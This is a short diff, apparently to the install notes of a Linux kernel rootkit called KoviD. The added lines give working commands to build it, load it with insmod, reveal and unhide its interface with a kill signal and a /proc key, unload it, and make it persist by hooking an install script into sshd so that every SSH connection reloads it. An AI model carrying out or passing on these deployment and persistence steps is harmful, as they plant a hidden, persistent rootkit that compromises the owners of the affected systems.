@@ -9,3 +9,32 @@ $ make -C volundr
 
 # Install rootkit
 $ sudo insmod ./kovid.ko
+
+
+# Install linux headers
+sudo apt install linux-headers-$(uname -r)
+
+# Install build-essential
+sudo apt install build-essential
+
+# check strace
+strace --version
+
+# build kovid
+UUIDGEN=<uuid> PROCNAME=<procname> DEPLOY=1 make
+
+# load kovid and check
+sudo insmod kovid.ko
+strace kill -CONT 501 2>&1 | grep "kill(501, SIGCONT)" | awk '{ print $4 }' # 22
+
+# unload
+kill -CONT 31337 # unhide ui, no root required
+echo "unhide-lkm=<unhide-key>" | sudo tee /proc/<procname>
+sudo rmmod -f kovid
+
+# persist. any connection to the ssh leads to load kovid
+git submodule update --init volundr
+make -C volundr
+UUIDGEN=<uuid> make persist
+cd scripts
+sudo UUIDGEN=<uuid> ./install.sh /usr/sbin/sshd
